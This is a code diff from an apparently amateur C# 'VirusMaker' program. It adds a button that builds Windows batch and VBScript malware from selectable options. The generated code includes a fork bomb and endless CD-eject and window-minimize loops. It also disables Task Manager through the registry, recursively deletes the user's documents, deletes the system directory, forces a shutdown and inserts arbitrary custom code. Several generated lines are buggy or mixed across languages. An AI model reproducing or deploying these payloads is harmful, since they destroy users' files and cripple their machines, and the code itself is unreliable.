@@ -90,5 +90,103 @@ namespace VirusMaker
                 msgLog.Text += "An error occured" + newLine;
             }
         }
+
+        // CREATE VIRUS BUTTON
+        private void createVirusBtn_Click(object sender, EventArgs e)
+        {
+            string batchContentsMain = "REM Made with Virus Maker (Pre-Release v0.1)" + newLine + "@echo off" + newLine;
+            string batchContentsLoop = ":start" + newLine;
+
+            string vbsContentsMain = "'Made with Virus Maker (Pre-Release v0.1)" + newLine + newLine;
+            
+            //  Just for fun group
+            if (swapMouseBtn_CB.Checked)
+            {
+                batchContentsMain += "REM Swap mouse buttons" + newLine
+                    + "Rundll32 user32,SwapMouseButton";
+            }
+            if (openCloseCD_CB.Checked)
+            {
+                vbsContentsMain += "'-- Open/Close CD Drive --" + newLine
+                    + "Set oWMP = CreateObject(\"WMPlayer.OCX.7\")" + newLine
+                    + "Set colCDROMs = oWMP.cdromCollection" + newLine
+                    + "if colCDROMs.Count >= 1 then" + newLine
+                    + "do" + newLine
+                    + "For i = 0 to colCDROMs.Count - 1" + newLine
+                    + "colCDROMs.Item(i).Eject" + newLine
+                    + "Next ' cdrom" + newLine
+                    + "For i = 0 to colCDROMs.Count - 1" + newLine
+                    + "colCDROMs.Item(i).Eject" + newLine
+                    + "Next ' cdrom" + newLine
+                    + "Loop" + newLine
+                    + "End If" + newLine + newLine;
+            }
+            if (minimiseWindows_CB.Checked)
+            {
+                vbsContentsMain += "'-- Minimize all windows --" + newLine;
+                vbsContentsMain += "Do While true" + newLine
+                    + "set objShell = CreateObject(\"shell.application\")" + newLine
+                    + "objShell.ToggleDesktop" + newLine 
+                    + "Loop" + newLine + newLine;
+            }
+            if (bombDesktop_CB.Checked)
+            {
+                batchContentsLoop += "REM Fork bomb"
+                    + "REM Fork bomb" + newLine
+                    + "start %0" + newLine
+                    + "%0|%0" + newLine;
+            }
+
+            // Harmful
+            if (disableTaskMng_CB.Checked)
+            {
+                vbsContentsMain += "-- Disable Task Manager --"
+                    + "Shell.RegWrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr\", 1, \"REG_DWORD\""
+                    + newLine + newLine;
+            }
+            if (dltMyDocuments_CB.Checked)
+            {
+                vbsContentsMain += "'-- Delete my documents --"
+                    + "GET-CHILDITEM \"$HOME\\My Documents\" -recurse | Remove-ITEM" + newLine + newLine;
+            }
+            if (dltSystem32_CB.Checked)
+            {
+                vbsContentsMain += "'-- Delete System32 --"
+                    + "Dim FSO, folder" + newLine
+                    + "set shell = WScript.CreateObject(\"WScript.Shell\")" + newLine
+                    + "folder = shell.ExpandEnvironmentStrings(\"%systemdir%\")" + newLine
+                    + "set FSO = CreateObject(\"Scripting.FileSystemObject\")" + newLine
+                    + "FSO.DeleteFolder(folder)" + newLine + newLine;
+            }
+
+            // Other options
+            if (shutdownComp_CB.Checked)
+            {
+                string shutdownWait = Convert.ToString(timeToWait_Value.Value);
+
+                vbsContentsMain += "'-- Shutdown computer --" + newLine
+                    + "set objShell = CreateObject(\"WScript.Shell\")" + newLine
+                    + "strShutdown = \"shutdown -s -t " + shutdownWait + " -f -m \"" + newLine
+                    + "objShell.Run strShutdown" + newLine + newLine;
+                MessageBox.Show(vbsContentsMain);
+            }
+            if (customCode.Text.Trim().Length > 0 && customCodeLang.Text.ToUpper() == "VBSCRIPT")
+            {
+                vbsContentsMain += "'-- Custom code --" + newLine
+                    + customCode.Text + newLine;
+            }
+            else if (customCode.Text.Trim().Length > 0 && customCodeLang.Text.ToUpper() == "BATCH")
+            {
+                batchContentsMain += "REM Custom code" + newLine
+                    + customCode.Text + newLine;
+            }
+            else if (customCode.Text.Trim().Length > 0 && customCodeLang.Text.ToUpper() != "VBSCRIPT" || customCodeLang.Text.ToUpper() != "BATCH")
+            {
+                MessageBox.Show("Please make sure that you have selected either 'VBScript' or 'Batch' in the custom code section.", "Invalid Custom Code", MessageBoxButtons.OK, MessageBoxIcon.Error);
+
+            }
+
+            batchContentsLoop += "goto start" + newLine;
+        }
     }
 }
